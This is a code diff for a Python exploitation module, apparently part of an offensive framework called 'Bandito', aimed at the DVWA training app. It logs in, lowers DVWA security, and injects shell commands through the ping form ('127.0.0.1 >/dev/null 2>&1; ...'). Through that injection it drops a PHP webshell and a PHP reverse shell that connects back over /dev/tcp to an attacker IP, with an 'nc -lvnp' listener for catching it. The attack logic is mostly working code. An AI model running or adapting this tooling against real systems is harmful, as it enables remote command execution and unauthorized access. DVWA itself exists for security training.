@@ -1,8 +1,6 @@
 import requests
 import os
 from datetime import datetime
-import subprocess
-import webbrowser
 
 class Tool:
     def __init__(self):
@@ -13,11 +11,9 @@ class Tool:
         self.upload_path = "/srv/dvwa/hackable/uploads"
         self.session = None
         self.logged_in = False
-        self.listener_ip = "0.0.0.0"
-
 
     def show_options(self):
-        print(colored("\nModule options (dvwa_web):", "orange"))
+        print(colored("\nModule options (WebRCE):", "orange"))
 
         options = [
             ("RHOST", self.target, "yes", "Target IP address or URL"),
@@ -31,28 +27,19 @@ class Tool:
         print("-" * 80)
 
         for name, value, required, desc in options:
-            print(f"{colored(name, 'reset'):<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")
+            print(f"{name:<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")
 
     def show_help(self):
-        if not self.logged_in:
-            print("\n=== DVWA Web Exploitation Tool ===")
-            print(f"Current target: {self.target}")
-            print("Step 1: Type 'setup' to login and set security to Low")
-            print("Commands:")
-            print("  setup                    - Login + set security to Low")
-            print("  set target <url/ip>      - Change target (auto-adds http://)")
-            print("  help                     - Show this help")
-            print("  back / exit              - Return to framework\n")
-        else:
-            print("\n=== DVWA Web Exploitation Tool ===")
-            print(f"Target: {self.target}")
-            print("Commands:")
-            print("  shell                    - Interactive command shell (Part 1)")
-            print("  upload_webshell          - Upload simple PHP webshell (Part 2)")
-            print("  upload_revshell <ip> <port> - Upload reverse shell (Part 2)")
-            print("  set target <url/ip>      - Change target")
-            print("  help                     - Show this help")
-            print("  back / exit              - Return to framework\n")
+        print("\n=== WebRCE Tool ===")
+        print(f"  Target: {self.target}")
+        print("Commands:")
+        print("  run                  - Login + set security to Low")
+        print("  shell                - Interactive command shell (Part 1)")
+        print("  upload_webshell      - Upload simple PHP webshell (Part 2)")
+        print("  upload_revshell <ip> <port> - Upload reverse shell (Part 2)")
+        print("  set target <url>     - Change target")
+        print("  help                 - Show this help")
+        print("  back / exit          - Return to framework\n")
 
     def handle_command(self, cmd_input):
         cmd = cmd_input.strip()
@@ -63,26 +50,19 @@ class Tool:
             return
 
         if low.startswith("set target"):
-            value = cmd.split(maxsplit=2)[2].strip() if len(cmd.split()) >= 3 else ""
-            if not value:
-                print("Usage: set target <url/ip>")
-                return
+            value = cmd.split(maxsplit=2)[2].strip()
             if not value.startswith(("http://", "https://")):
                 value = "http://" + value
             self.target = value.rstrip("/")
-            print(f"[+] Target updated to {self.target}")
+            print(f"[+] target → {self.target}")
             return
 
-        if low in ["exploit", "run", "setup"]:
+        if low in ["run", "exploit", "setup"]:
             self._login()
-            print(colored("Exploit ready. Available actions:", "green"))
-            print("  shell                    - Start interactive shell")
-            print("  upload_webshell          - Drop webshell")
-            print("  upload_revshell <ip> <port> - Drop reverse shell")
             return
 
         if not self.logged_in:
-            print("[-] Not logged in. Type 'setup' first.")
+            print("[-] Not logged in. Type 'run' first.")
             return
 
         if low == "shell":
@@ -105,10 +85,8 @@ class Tool:
             print("[*] Returning to Bandito framework...")
             return
 
-        # Sanitized unknown command
-        print(f"[-] Unknown command: '{cmd}'")
+        print(colored(f"[-] Unknown command: {cmd}", "red"))
         print("Type 'help' for available commands.")
-        self.show_help()
 
     def _login(self):
         if self.logged_in:
@@ -140,7 +118,7 @@ class Tool:
         if "Logout" in r_login.text:
             print("[+] Login successful")
         else:
-            print("[-] Login failed - check target/credentials")
+            print("[-] Login failed")
             return
 
         sec_url = f"{self.target}/security.php"
@@ -191,22 +169,13 @@ class Tool:
         self.session.post(vuln_url, data=data)
 
         print("[+] Webshell uploaded")
-        print(f"Test in browser: {self.target}/hackable/uploads/shell.php?cmd=whoami")
-        print("Examples: ?cmd=id, ?cmd=ip%20a, ?cmd=uname%20-a")
+        print(f"Test: {self.target}/hackable/uploads/shell.php?cmd=whoami")
 
-    def upload_revshell(self, attacker_ip=None, port=4444):
-        if attacker_ip is None:
-            attacker_ip = "0.0.0.0"  # Listen on all interfaces
+    def upload_revshell(self, attacker_ip, port):
+        rev = f'<?php system("bash -c \'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\' 2>&1"); ?>'
+        safe = rev.replace("'", "'\\''").replace("\\", "\\\\")
 
-        if not self.logged_in:
-            self._login()
-
-        print(f"[*] Uploading reverse shell → {attacker_ip}:{port}")
-
-        rev_content = f'<?php system("bash -c \'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\' 2>&1"); ?>'
-        safe_content = rev_content.replace("'", "'\\''")
-
-        cmd = f"echo '{safe_content}' > {self.upload_path}/rev.php"
+        cmd = f"echo '{safe}' > {self.upload_path}/rev.php"
         payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
         data = {"ip": payload, "Submit": "Submit"}
         vuln_url = f"{self.target}/vulnerabilities/exec/"
@@ -217,52 +186,5 @@ class Tool:
 
         print("[+] Reverse shell uploaded")
         print(f"Trigger URL: {trigger_url}")
-
-        # === AUTOMATION: Try to open new terminal with nc ===
-
-        listener_cmd = f"nc -lvnp {port}"
-        print(f"[*] Attempting to open new terminal with listener: {listener_cmd}")
-
-        opened = False
-
-        # Try gnome-terminal (Ubuntu default)
-        try:
-            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", listener_cmd + "; exec bash"])
-            opened = True
-            print("[+] Opened in gnome-terminal")
-        except:
-            pass
-
-        # Try xterm (fallback)
-        if not opened:
-            try:
-                subprocess.Popen(["xterm", "-e", listener_cmd])
-                opened = True
-                print("[+] Opened in xterm")
-            except:
-                pass
-
-        # Try terminator (if installed)
-        if not opened:
-            try:
-                subprocess.Popen(["terminator", "-e", listener_cmd])
-                opened = True
-                print("[+] Opened in terminator")
-            except:
-                pass
-
-        if not opened:
-            print("[-] Could not open new terminal automatically.")
-            print(f"  Please open a new terminal manually and run: {listener_cmd}")
-
-        # Open trigger URL
-        print("[+] Opening trigger URL in browser...")
-        import webbrowser
-        webbrowser.open(trigger_url)
-
-        print("\n" + "="*70)
-        print("Reverse shell should connect soon!")
-        print("Look for a new terminal window with netcat running.")
-        print("Once connected, type commands there (whoami, ip a, id, pwd, etc.)")
-        print("If no new terminal opened, start nc manually in a new window.")
-        print("="*70)
+        print(f"Start listener: nc -lvnp {port}")
+        print("Open the trigger URL in browser to catch shell")
